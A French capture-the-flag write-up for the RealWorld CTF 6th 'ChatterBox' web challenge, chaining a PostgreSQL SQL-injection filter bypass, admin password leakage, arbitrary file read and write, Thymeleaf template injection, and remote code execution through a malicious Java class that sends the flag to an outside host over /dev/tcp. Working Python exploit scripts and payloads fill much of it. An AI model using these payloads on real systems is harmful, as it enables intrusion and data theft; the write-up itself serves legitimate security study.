---
title: "ChatterBox | RealWorld CTF 6th"
date: 2024-01-28T12:00:00Z
description: "Writeup ChatterBox | RealWorld CTF 6th (2024) | Catégorie Web"
categories: ["writeup"]
tags: ["web","tuto","writeup"]
keywords: ["web", "ctf","RealWorld","ctftime","chatterbox","sqli","ssti","rce"]
---

## Fichiers:
- [ChatterBox_source.zip](./files/ChatterBox_source.zip)

## Description:
I wanna inject sth in my Box what should i do？
``nc <ip> 9999``


## Solution détaillée:

Voici les fichiers fournis par l'auteur: 
```bash
$ tree .
.
├── ChatterBox-0.0.1-SNAPSHOT.jar
├── docker-compose.yml
├── Dockerfile
├── flag
├── init.sql
├── readflag
└── start.sh
```

En regardant rapidement le Dockerfile, on comprend que le flag est copié dans ``/flag`` et que le binaire ``/readflag`` va nous permettre de le lire.
Un serveur web est unfichier ``jar`` et nous allons devoir l'exploiter pour avoir une execution de commande sur le serveur.

On va utiliser [jadx](https://github.com/skylot/jadx) pour décompiler le fichier et récuperer le code source.
On a dans ``com/chatterbox`` l'application web, la class ``ChatterBoxApplication`` nous informe que c'est une application *Spring*:

![screen1](./img/screen1.png)

On peut lancer l'application en local et accéder au l'application en ``http://127.0.0.1:8080``:   
```bash
docker-compose up --build
```

![screen2](./img/screen2.png)

Nous faisons face à un portail de connexion.
D'aprés le fichier ``init.sql``, il n'existe qu'un seul utilisateur **admin**:
```sql
-- ----------------------------
-- Records of message_users
-- ----------------------------
BEGIN;
INSERT INTO "public"."message_users" VALUES (1, 'admin', 'xxxxxxx');
COMMIT;
```

En continuant de fouiller dans jdax, on trouve 3 controllers pour l'application spring: 
- LoginController
- MessageBoardController
- NotifyController

### Première vulnérabilité: Injection SQL

Les deux derniers controllers nécessitent d'être authentifié, nous allons donc nous focaliser sur la partie de connexion:

Le controller implémente une seule route en ``/login`` qui prend en paramètre *username* et *passwd*
Voici le code simplifié:

```java
public String doLogin(HttpServletRequest request, Model model, HttpSession session) throws Exception {
    String username = request.getParameter(DruidDataSourceFactory.PROP_USERNAME);
    String password = request.getParameter("passwd");
    if (username != null && password != null) {
        if (!SQLCheck.checkBlackList(username) || !SQLCheck.checkBlackList(password)) {
            model.addAttribute(BindTag.STATUS_VARIABLE_NAME, 500);
            model.addAttribute(JsonEncoder.MESSAGE_ATTR_NAME, "Ban!");
            return "error";
        }
        String sql = "SELECT id,passwd FROM message_users WHERE username = '" + username + "'";
        if (SQLCheck.check(sql)) {
            
            // Do sql query
            // ...

            // Check if password returned is equal to the one provided.
            // ...
        }
    }
}
```

#### Bypass des filtres

On remarque immédiatement une **injection SQL** dans le paramètre ``username``. Pourtant, plusieurs checks sont effectués avant d'executer la requète et ce sont eux que nous allons devoir contourner.  

Le premier est celui-ci: 
```java
if (!SQLCheck.checkBlackList(username) || !SQLCheck.checkBlackList(password)) {
    model.addAttribute(BindTag.STATUS_VARIABLE_NAME, 500);
    model.addAttribute(JsonEncoder.MESSAGE_ATTR_NAME, "Ban!");
    return "error";
}
``` 

```java
public static boolean checkBlackList(String sql) {
    String sql2 = sql.toUpperCase();
    for (String temp : getBlackList().stream()) {
        if (sql2.contains(temp)) {
            return false;
        }
    }
    return true;
}
```

Le serveur vérifie que les paramètres de connections (en majuscule) ne comprennent pas un des mots suivants:
```python
[
       "SELECT","UNION","INSERT","ALTER","SLEEP","DELETE","--",";"","#","&","/*", 
       "OR","EXEC","CREATE","AND","DROP","DO","COPY","SET","VACUUM","SHOW","CURSOR",
       "TRUNCATE","CAST","BEGIN","PERFORM","END","CASE","WHEN","ALL","TABLE","UPDATE",
       "TRIGGER","FUNCTION","PROCEDURE","DECLARE","RETURNING","TABLESPACE","VIEW",
       "SEQUENCE","INDEX","LOCK","GRANT","REVOKE","SAVEPOINT","ROLLBACK","IMPORT",
       "COMMIT","PREPARE","EXECUTE","EXPLAIN","ANALYZE","DATABASE","PASSWORD","CONNECT",
       "DISCONNECT","PG_SLEEP","MERGE","USING","LIMIT","OFFSET","RETURN","ESCAPE","LIKE",
       "ILIKE","RLIKE","EXISTS","BETWEEN","IS","NULL","NOT","GROUP","BY","HAVING","ORDER",
       "WINDOW","PARTITION","OVER","FOREIGN KEY","REFERENCE","RAISE","LISTEN","NOTIFY",
       "LOAD","SECURITY","OWNER","RULE","CLUSTER","COMMENT","CONVERT","COPY","CHECKPOINT",
       "REINDEX","RESET","LANGUAGE","PLPGSQL","PLPYTHON","SECDEF","NOCREATEDB",
       "NOCREATEROLE","NOINHERIT","NOREPLICATION","BYPASSRLS","FILE","PG_","IMPORT","EXPORT"
]
```

Cette vérification nous empêche les injections classique du type: ``' OR 1=1 -- ``.

De plus, la 2nd vérification appele la méthode ``check`` de la class ``SQLCheck``:
```java
public static boolean check(String sql) {
    return checkValid(sql.toUpperCase());
}
```
qui elle même appele *checkValid*:  

```java
public static boolean filter(String sql) {
    if (StringUtil.matches(sql, "^[a-zA-Z0-9_]*$") || sql.contains(" USER_DEFINE ")) {
        return true;
    }
    if (sql.startsWith("SELECT") && sql.contains("VIEW")) {
        return true;
    }
    for (String whitePrefix : getWhitePrefix().stream()) {
        if (sql.startsWith(whitePrefix)) {
            return true;
        }
    }
    return false;
}

private static boolean checkValid(String sql) {
    try {
        return SQLParser.parse(sql);
    } catch (SQLException e) {
        try {
            List<SQLStatement> sqlStatements = SQLUtils.parseStatements(sql, JdbcConstants.POSTGRESQL);
            if (sqlStatements != null && sqlStatements.size() > 1) {
                return false;
            }
            for (SQLStatement statement : sqlStatements.stream()) {
                if (statement instanceof PGSelectStatement) {
                    SQLSelect sqlSelect = ((SQLSelectStatement) statement).getSelect();
                    SQLSelectQuery sqlSelectQuery = sqlSelect.getQuery();
                    if (sqlSelectQuery instanceof SQLUnionQuery) {
                        return false;
                    }
                    SQLSelectQueryBlock sqlSelectQueryBlock = (SQLSelectQueryBlock) sqlSelectQuery;
                    if (!filtetFields(sqlSelectQueryBlock.getSelectList()) || !filterTableName((SQLExprTableSource) sqlSelectQueryBlock.getFrom()).booleanValue()) {
                        return false;
                    }
                    if (!filterWhere(sqlSelectQueryBlock.getWhere())) {
                        return false;
                    }
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            if (filter(sql)) {
                return true;
            }
            throw new SQLException("SQL Parsing Exception~");
        }
    }
}
```

Nous allons donc chercher à exfiltrer le mot de passe administrateur via la SQLI en abusant du fonctionnement de la fonction *checkValid*

La première chose qu'il faut remarquer et que la fonction **filter** est assez peu strict et que si la requète contient ``USER_DEFINE`` et ``SELECT``, la requète sera considérée comme sûr !

Pour atteindre l'appel à cette fonction **filter**, nous devons d'abord faire crasher deux blocs de code afin d'atteindre deux fois les **catch**.

Le premier catch à déclencher est celui ci: 
```java
try {
    return SQLParser.parse(sql);
} catch (SQLException e) {
    // Do some juicy code
}
```

Le seconde catch à déclencher: 
```java
try {
    List<SQLStatement> sqlStatements = SQLUtils.parseStatements(sql, JdbcConstants.POSTGRESQL);
    if (sqlStatements != null && sqlStatements.size() > 1) {
        return false;
    }
    for (SQLStatement statement : sqlStatements.stream()) {
        if (statement instanceof PGSelectStatement) {
            SQLSelect sqlSelect = ((SQLSelectStatement) statement).getSelect();
            SQLSelectQuery sqlSelectQuery = sqlSelect.getQuery();
            if (sqlSelectQuery instanceof SQLUnionQuery) {
                return false;
            }
            SQLSelectQueryBlock sqlSelectQueryBlock = (SQLSelectQueryBlock) sqlSelectQuery;
            if (!filtetFields(sqlSelectQueryBlock.getSelectList()) || !filterTableName((SQLExprTableSource) sqlSelectQueryBlock.getFrom()).booleanValue()) {
                return false;
            }
            if (!filterWhere(sqlSelectQueryBlock.getWhere())) {
                return false;
            }
            return true;
        }
    }
    return false;
} catch (Exception e2) {
    // do some juicy code
}
```

On peut trigger les exceptions en faisant passer une requète sql invalide dans ``sql``.
En revanche, la query SQL finale doit pourtant être valide puisqu'elle va être executé par *Postgresql* par la suite.

Nous devons donc nous attarder sur le détail suivant: 
```java
public static boolean check(String sql) {
    return checkValid(sql.toUpperCase());
}
```

La requète SQL qui est testée est en majuscule alors que celle executée restera en minuscule.  
Nous devons donc trouver une manière de forger une requète SQL invalide uniquement quand elle est mise en majuscule. *(sql.toUpperCase())*

D'aprés [4.1.2.2](https://www.postgresql.org/docs/8.1/sql-syntax.html), on peut lire ceci: 
```
PostgreSQL provides another way, called "dollar quoting", to write string constants.
Example: 
- $SomeTag$Dianne's horse$SomeTag$
- $$Dianne's horse$$
```


PostgreSQL nous montre qu'il est possible de créer des constantes grâce à des $, un peu comme des balises en HTML.
Voici un exemple:

```bash
postgres=# SELECT ($a$ Hello $a$);
 postgres
 ?column?
----------
  Hello
(1 row)
```

En reprenant le même principe, on peut forger la forger ceci: 
```sql
$u$foo$U$ USER_DEFINE $U$bar$u$
```

Du point de vue de la requète en minuscule, on aura la chaine de caractère ``"foo$U$ USER_DEFINE username=$U$bar"``.  
Avec la requète en majuscule, on aura la query sql avec: ``$U$F00$U$ USER_DEFINE $U$BAR$U$`` ce qui sera rendu en : 
``"FOO" USER_DEFINE "BAR"``, ce qui n'est valide pour la syntaxe SQL.

Finalement, on peut ajouter un ``SUBSTR(...,0,0)`` pour ne pas prendre en compte la chaine de caractères ``"foo$U$ USER_DEFINE username=$U$bar"`` 

Ainsi, en envoyer l'username suivant:  
```sql
'||substr($u$foo$U$ USER_DEFINE $U$bar$u$,0,0)||'
```

On forge la requète suivante:  
```sql
SELECT id,passwd FROM message_users WHERE username = ''||substr($u$foo$U$ USER_DEFINE $U$bar$u$,0,0)||'';
```

On peut maintenant ajouter ce que l'on veut à droite de la requète pour exfiltrer le mot de passe.  
*(Nous sommes toujours contraint de respecter le filtre par mots clés)*

#### Exfiltration du mot de passe

La méthode trouvé a été d'ajouter le sufffix ``::json`` au mot passe afin de faire un *cast* du mot de passe de l'administrateur en json. Le cast va provoquer une erreur qui sera renvoyé et le mot de passe sera affiché dans la stacktrace:

```sql
'||substr($u$foo$U$ USER_DEFINE $U$bar$u$,0,0)||passwd::json||'
```

![Screen3](./img/screen3.png)

Enfin, le mot de passe étant plus long que 7 caractères, l'utilisation de python a permit de scripter l'exfiltration de bloc de 7 lettres via ``substr``.

```python
import requests
import re

class client:
    def __init__(self, url):
        self.url = url
        self.s = requests.session()
        self.bypass = 'substr($u$foo$U$ USER_DEFINE $U$bar$u$,0,0)'

    def leak_admin_password(self, max_len=50):
        def leak_char(position = 1):
            username = f"'||{self.bypass}||SUBSTR(passwd,{position},7)::json||'"
            html = self.s.post(f'{self.url}/login',data={"username": username,"passwd": "x"}).text
            letter = re.findall(r"Detail: Token &quot;(.*?)&quot; is invalid", html)
            if letter and letter != ['']:
                return letter[0][0]
            return "?"

        password = ''
        for i in range(max_len):
            password += leak_char(position=len(password)+1)
        return password.strip('?')

c = client(url = 'http://<ip>:8080')
admin_passwd = c.leak_admin_password()
print(admin_passwd)
# WeakPassdcf03cde-bc56-11ee-9acc-0242ac110017!!
```

### Seconde vulnérabilité: Lecture et Ecriture de fichier arbitraire

Une fois connecté, on se retrouve fasse à un formulaire pour poster des messages:  
![Screen4](./img/screen4.png)

Dans le controller **MessageBoardController**, on retrouver le code suivant: 
```java
public String postMessage(@RequestParam String content, HttpSession session, Model model) {
    Integer userId = (Integer) session.getAttribute("userId");
    if (userId != null && userId.intValue() == 1) {
        String var10000 = userId.toString();
        String sql = "INSERT INTO messages (user_id, content) VALUES (" + var10000 + ", '" + content + "')";
        if (!SQLCheck.checkBlackList(content)) {
            model.addAttribute(BindTag.STATUS_VARIABLE_NAME, 500);
            model.addAttribute(JsonEncoder.MESSAGE_ATTR_NAME, "Hacker！");
            return "error";
        } else if (SQLCheck.check(sql)) {
            this.jdbcTemplate.update(sql);
            return "redirect:/";
        } else {
            return "redirect:/";
        }
    }
    return "redirect:/";
}
```

Une seconde injection SQL dans le *INSERT* permet d'ajouter ce que l'on veut dans la base de donnée. 
De la même manière que la première sqli, nous pouvons utiliser les ``$`` pour échapper le filtre.

![Screen5](./img/screen5.png)

Afin de contourner le filtre sur les mots clés, nous pouvons combiner l'utilisation de la fonction ``query_to_xml`` ainsi que les fonctions d'encodage/décodage d'hexadécimal de *postgresql*.

On peut convertir une query ``SELECT '1'`` en hexadecimal: ``53454c45435420273127`` et la faire executer comme ceci:

```sql
query_to_xml(encode(decode('53454c45435420273127','hex'),'es'||'cape'),true,true,'')
```

Ce qui donne: 
```sql
'||substr($u$foo$U$ USER_DEFINE $U$bar$u$,0,0)|| (query_to_xml(encode(decode('53454c45435420273127', 'hex'),'esc'||'ape'),true,true,'')) ||'
```

![Screen5](./img/screen6.png)

De cette manière, on peut mettre à jour notre script pour executer n'importe quelle requète *SELECT* dans le *INSERT*:
```python
from binascii import hexlify

blacklist = ["SELECT","UNION","WHERE","INSERT","ALTER","SLEEP","DELETE","OR","EXEC","CREATE","AND","DROP","DO","COPY","SET","VACUUM","SHOW","CURSOR","TRUNCATE","CAST","BEGIN","PERFORM","END","CASE","WHEN","ALL","TABLE","UPDATE","TRIGGER","FUNCTION","PROCEDURE","DECLARE","RETURNING","TABLESPACE","VIEW","SEQUENCE","INDEX","LOCK","GRANT","REVOKE","SAVEPOINT","ROLLBACK","IMPORT","COMMIT","PREPARE","EXECUTE","EXPLAIN","ANALYZE","DATABASE","PASSWORD","CONNECT","DISCONNECT","PG_SLEEP","MERGE","USING","LIMIT","OFFSET","RETURN","ESCAPE","LIKE","ILIKE","RLIKE","EXISTS","BETWEEN","IS","NOT","GROUP","BY","HAVING","ORDER","WINDOW","PARTITION","OVER","FOREIGN", "KEY","REFERENCE","RAISE","LISTEN","NOTIFY","LOAD","SECURITY","OWNER","RULE","CLUSTER","COMMENT","CONVERT","COPY","CHECKPOINT","REINDEX","RESET","LANGUAGE","PLPGSQL","PLPYTHON","SECDEF","NOCREATEDB","NOCREATEROLE","NOINHERIT","NOREPLICATION","BYPASSRLS","FILE","PG_","IMPORT","EXPORT"]

def escape(query):  
    query = query.lower()
    for word in blacklist:
        word = word.lower()
        query = query.replace(word, word[:len(word)//2]+"'||'"+word[len(word)//2:])
    return query

class client:
    def __init__(self, url):
        ...

    def login(self, username, password):
        self.s.post(f'{self.url}/login', data={'username': username, 'passwd': password})

    def post_message(self, content):
        self.s.post(f'{self.url}/post_message', data={'content': content}).text

    def sqli(self, query):
        query = escape(f'''
        encode(decode('{hexlify(query.encode()).decode()}', 'hex'),'escape')
        '''.strip())
        self.post_message(content=f'''
        '||{self.bypass}|| (query_to_xml({query},true,true,'')) ||'
        '''.strip())

c = client(url = 'http://<ip>:8080')
admin_passwd = c.leak_admin_password()
c.login('admin', admin_passwd)
c.sqli(query="SELECT '1'")
```

#### File read
On peut utiliser la fonction ``pg_read_file`` pour lire des fichiers du serveur:
```python
class client:
    def __init__(self, url):
        ...

    def file_read(self, path):
        self.sqli(query=f"SELECT pg_read_file('{path}', 0, 200)")

...
c = client(url = 'http://<ip>:8080')
admin_passwd = c.leak_admin_password()
c.login('admin', admin_passwd)
c.file_read(path='/etc/passwd')
```

![Screen7](./img/screen7.png)

Malheuresement, le DockerFile spécifie cette ligne: ``RUN chmod 000 /flag`` qui empêche ici le serveur SQL de lire le contenu du flag.

#### File write
Toujours avec **query_to_xml**, on peut utiliser les fonctions: 
- lo_from_bytea
- lo_export
pour ecrire ce que l'on veut, ou l'on veut:

```python
from random import randint

class client:
    def __init__(self, url):
        ...

    def file_write(self, data, path):
        id_ = 43210+randint(1,99999)
        query = f'''
        encode(decode('{hexlify(data.encode()).decode()}', 'hex'),'escape')
        '''.strip()
        cmd = [
            f"SELECT lo_from_bytea({id_}, decode('{data.encode().hex()}', 'hex'))",
            f"SELECT lo_export({id_}, '{path}')"
        ]
        for c in cmd:
            self.sqli(query=c)

c = client(url = 'http://<ip>:8080')
admin_passwd = c.leak_admin_password()
c.login('admin', admin_passwd)
c.file_write(
    data='Hello World',
    path=f"/tmp/poc.txt"
)
```

Résultat: 
```bash
root@e372113213c7:/# ls /tmp
hsperfdata_root  poc.txt  tomcat-docbase.8080.4797479350720433534  tomcat.8080.4797479350720433534
root@e372113213c7:/# cat /tmp/poc.txt
Hello World
root@e372113213c7:/#
```

### Troisième vulnérabilité: Injection de template
Un dernier controller n'a pas encore été exploité: ``NotifyController``.  
Celui-ci implémente une seule route en GET: ``/notify``

```java
private String templatePrefix = "file:///non_exists/";
private String templateSuffix = ".html";


@GetMapping({"/notify"})
public String notify(@RequestParam String fname, HttpSession session) throws IOException {
    InputStream inputStream;
    Integer userId = (Integer) session.getAttribute("userId");
    if (userId != null && userId.intValue() == 1) {
        if (!fname.contains("../") && (inputStream = this.applicationContext.getResource(this.templatePrefix + fname + this.templateSuffix).getInputStream()) != null && safeCheck(inputStream)) {
            String result = getTemplateEngine().process(fname, new Context());
            return result;
        }
        return "error";
    }
    return "redirect:login";
}
```

Il prend un paramètre ``fname`` et essaye de render le fichier ``/non_exists/<fname>.html`` avec le template engine [thymeleaf](https://www.thymeleaf.org)

Une fonction ``safeCheck`` vérifie que la template, si elle existe, ne contienne pas ``<``, ``>``, ``org.apache`` ou encore ``org.spring``. Cette fonction nous indique clairement qu'il existe une injection de template dans le code et qu'il faut l'exploiter pour arriver à l'execution de commande finale.

#### 1er Bypass: /non_exists/
Le serveur va aller chercher une template dans un dossier **non_exists** à la racine de la machine. Ce dossier n'existant pas, la lecture du fichier mènera à un crash de la requète si nous ne trouvons pas un moyen de rediriger le path.  
En remontant avec ``../``, une erreur se produit aussi:
```bash
root@e372113213c7:/# cat /non_exists/../etc/passwd
cat: /non_exists/../etc/passwd: No such file or directory
```
ou dans les logs docker:
```
java.io.FileNotFoundException: /non_exists/../etc/passwd.html (No such file or directory)
```

Aprés un long moment de test et de fuzzing, il se trouve que le ``\`` *(%5C)* permet de bypass ce dossier erroné.  
Ainsi, en envoyant ``fname=..%5cetc/passwd``, le serveur tentera de charger ``/etc/passwd.html`` comme template.

#### 2nd Bypass: .html

On peut bypass l'ajout du suffix **.html** en ajoutant à la fin du fichier un ``?`` *(%3F)*.  
Finalement, on peut tester de charger */etc/passwd* comme template avec le *fname* suivant:  
```
..%5cetc/passwd%3F
```

```python
class client:
    def __init__(self, url):
        ...

    def notify(self, payload):
        r = self.s.get(f'{self.url}/notify?fname={payload}').text
        return r

c = client(url = 'http://<ip>:8080')
admin_passwd = c.leak_admin_password()
c.login('admin', admin_passwd)
r = c.notify(payload='..%5cetc/passwd%3F')
print(r)
```

En executant le code précédent, voici la réponse obtenue: 
```json
{"timestamp":"2024-01-29T17:19:07.325+00:00","status":500,"error":"Internal Server Error","path":"/notify"}
```

Si on regarde attentivement les logs docker, on obtient:
```
Error resolving template [ <contenu de /etc/passwd> ], template might not exist or might not be accessible by any of the configured Template Resolvers] with root cause
```

![Screen8](./img/screen8.png)

Aprés quelques recherches, on se rend compte que *thymeleaf* va ouvrir le contenu du fichier fourni et va essayer de trouver une template correspondante.  
Le souci ici est que les templates connues par *thymeleaf* sont directement incluses dans le .jar et qu'il n'est pas possible d'en rajouter simplement.

Heuresement pour nous, en cherchant dans le code de *thymeleaf*, [ici](https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java#L277) précisement, on se rend compte que le nom de la template qu'il va rechercher est d'abord rendu par le moteur de template !  
La condition pour le nom de la template soit évaluer est qu'il contienne ``::``  

**On peut donc utiliser l'injection SQL pour écrire un fichier contenant une SSTI et faire pointer *thymeleaf* vers ce fichier afin que le contenu soit évaluer !**

```python
c = client(url = 'http://<ip>:8080')
admin_passwd = c.leak_admin_password()
c.login('admin', admin_passwd)
c.file_write(
    data='__${7*7}__::.x',
    path=f"/tmp/rce"
)
c.notify(payload='..%5ctmp/rce%3F')
```

On obtient bien dans les logs docker: 
```
Error resolving template [49], template might not exist or might not be accessible by any of the configured Template Resolvers
```

![Alt text](./img/screen9.png)

### SSTI to RCE
Maintenant que nous avons notre injection de template, nous devons trouver un moyen d'éxécuter du code.

Beaucoup de choses ont été testées, comme par exemple l'utilisation de ``T(java.lang.Runtime).getRuntime()`` ou encore la librairie vulnérable ``SnakeYaml``. Aucune de ces tentatives n'a fonctionné... 

Finalement, nous avons utilisé ``strace`` pour regarder les appels système fait pas le serveur WEB:  
```bash
sudo apt install strace
sudo strace -fie file -p $(pidof -s java)
```

Le serveur tenté de charger des class depuis un dossier de */tmp*: ``/tmp/tomcat-docbase.8080.4797479350720433534/WEB-INF/classes/``:  
```
[pid    80] [00007fb0552b43a6] stat("/tmp/tomcat-docbase.8080.4797479350720433534/WEB-INF/classes", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
```

L'idée est la suivante:   
- Ecrire une class malveillante dans **/tmp/Tfns.class**  
- Utiliser la SQLI pour trouver le dossier tomcat  
- Créer un dossier **/tmp/tomcat-docbase.8080.4797479350720433534/WEB-INF/classes/**  
- Copier **/tmp/Tfns.class** dans le dossier créer  
- Charger la class  

On peut récuperer le nom du dossier sur le serveur de la manière suivante:  
```python
class client:
    def __init__(self, url):
        ...

    def file_list(self, path):
        self.sqli(query=f"SELECT pg_ls_dir('{path}')")


c = client(url = 'http://<ip>:8080')
admin_passwd = c.leak_admin_password()
c.login('admin', admin_passwd)
c.file_list('./../../../../../tmp')
```

![Alt text](./img/screen10.png)


#### Bypass de la fonction *safeCheck*

La fonction *safeCheck* nous empêche d'avoir un payload contenant:   
- "org.spring"  
- "org.apache"  
- "<"  
- ">"  

Pour récuperer des class provenant de "org.apache" ou "org.spring", nous pouvons utiliser cette technique:  
```bash
''.getClass().forName("org."+"apache.catalina.startup.ExpandWar")
```

#### Création du répertoire
La class *FileUtils* de *"org.apache.tomcat.util.http.fileupload* a était utilisé avec la méthode: ``forceMkdir``

#### Copy du fichier 
La class *ExpandWar* de *"org.apache.catalina.startup.ExpandWar* avec la méthode ``copy`` à permit de déplacer le fichier

#### Chargement de la class et RCE
Enfin la méthode loadClass de *"ch.qos.logback.core.util.Loader"* a permis de charger la class malveillante et de RCE !

*(Note: C'est Tomcat qui a créé le dossier, c'est pour cela qu'une copie du fichier malveillant par le serveur web était nécessaire au lieu de directement l'écrire au bon endroit)*


Voici la class malveillante:

- tfns.java
```java
import java.io.IOException;

class Tfns
{
    public static void pwn() {
        try {
            String[] cmd = {"/bin/bash", "-c", "/readflag > /dev/tcp/<ip>/3333"};
            Runtime.getRuntime().exec(cmd);
        } catch(IOException e) {
        }
    }
}
```
```bash
javac tfns.java
cat tfns.class| base64
```

et : 

```python
c = client(url = 'http://<ip>:8080')
admin_passwd = c.leak_admin_password()
c.login('admin', admin_passwd)

payload_class = '''
yv66vgAAAD0AIwoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClW
BwAIAQAQamF2YS9sYW5nL1N0cmluZwgACgEACS9iaW4vYmFzaAgADAEAAi1jCAAOAQAoL3JlYWRm
bGFnID4gL2Rldi90Y3AvMTc2LjE0My4xMDIuNDcvMzMzMwoAEAARBwASDAATABQBABFqYXZhL2xh
bmcvUnVudGltZQEACmdld          [REDACTED]          QAAMACQAfAAYAAQAdAAAAXgAE
AAEAAAAhBr0AB1kDEglTWQQSC1NZBRINU0u4AA8qtgAVV6cABEuxAAEAAAAcAB8AGQACAB4AAAAW
AAUAAAAHABQACAAcAAoAHwAJACAACwAgAAAABwACXwcAGQAAAQAhAAAAAgAi
'''.strip().replace('\n','')

c.file_write(
    data=payload_class,
    path=f"/tmp/Tfns.class"
)
all_payloads = [
    '''
''.getClass().forName("org."+"apache.tomcat.util.http.fileupload.FileUtils").forceMkdir(
    "/tmp/tomcat-docbase.8080.4797479350720433534/WEB-INF/classes/"
)
'''.strip(),
    '''
''.getClass().forName("org."+"apache.catalina.startup.ExpandWar").copy(
    "/tmp/Tfns.class","/tmp/tomcat-docbase.8080.4797479350720433534/WEB-INF/classes/Tfns.class"
)
'''.strip(),
    '''
''.getClass().forName("ch.qos.logback.core.util.Loader").loadClass("Tfns").pwn()
'''.strip(),
]
for payload in all_payloads:
    c.file_write(
        data="__${%s}__::.x"% payload,
        path=f"/tmp/rce"
    )
    c.notify(payload='..%5ctmp/rce%3F')
```

Et enfin: 
```bash
$ nc -lvnp 3333
listening on [any] 3333 ...
connect to [<IP>] from (UNKNOWN) [<IP>] 56874
rwctf{b2ed2442-b9e0-11ee-a668-00163e01b905}
```

## Références:
- [Veracode - Spring View Manipulation Vulnerability](https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability)
- [Acunetix - Exploiting ssti in thymeleaf](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)
- [AeroCTF - Localization is hard](https://ret2school.github.io/post/localization_is_hard_wu/)
- [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java)
- [PayloadsAllTheThings - PostgreSQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/)
- [Postgresql docs](https://www.postgresql.org/docs/8.1/sql-syntax.html)